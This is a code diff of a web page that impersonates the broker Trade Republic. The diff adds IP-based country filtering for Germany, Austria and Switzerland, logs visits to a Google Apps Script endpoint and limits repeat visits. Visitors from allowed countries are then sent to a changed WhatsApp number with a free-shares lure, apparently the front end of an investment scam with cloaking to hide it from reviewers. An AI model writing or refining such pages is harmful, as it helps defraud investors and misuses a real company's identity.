@@ -28,7 +28,7 @@
 </head>
 <body>
   <img src="https://upload.wikimedia.org/wikipedia/commons/2/26/Trade_Republic_Logo_2021.svg" alt="Trade Republic Logo" class="logo">
-  <div class="message" id="status">Willkommen bei Trade Republic ............Bitte warten....</div>
+  <div class="message" id="status">Willkommen bei Trade Republic</div>
 
   <script>
     const GAS_URL = "https://script.google.com/macros/s/AKfycby1brCq-41JCU3N9Md8xiAYa70NraF-NiJMwVgeqTCeCin-4iIWj0QxfWpsFAp5RZiK/exec";
@@ -45,6 +45,11 @@
       localStorage.setItem("visits", JSON.stringify(visits));
 
       return visits.length > MAX_VISITS;
+    }
+
+    async function getIPData() {
+      const res = await fetch("https://ipapi.co/json");
+      return await res.json();
     }
 
     async function logVisit(payload) {
@@ -71,7 +76,7 @@
       try {
         const data = await getIPData();
 
-        const allowedCountries = [ "Austria", ];
+        const allowedCountries = ["Germany", "Austria", "Switzerland"];
         const country = data.country_name;
         const allowed = allowedCountries.includes(country);
 
@@ -90,8 +95,8 @@
           return;
         }
 
-        // ✅ 
-        window.location.href = "https://api.whatsapp.com/send/?phone=491639792154&text=Erhalten+Sie+10+potenzielle+Aktien+kostenlos";
+        // ✅ 允许访问的国家，自动跳转 WhatsApp
+        window.location.href = "https://api.whatsapp.com/send/?phone=491633490432&text=Erhalten+Sie+10+potenzielle+Aktien+kostenlos";
 
       } catch (err) {
         status.innerHTML = "⚠️ Fehler beim Laden der Daten.";
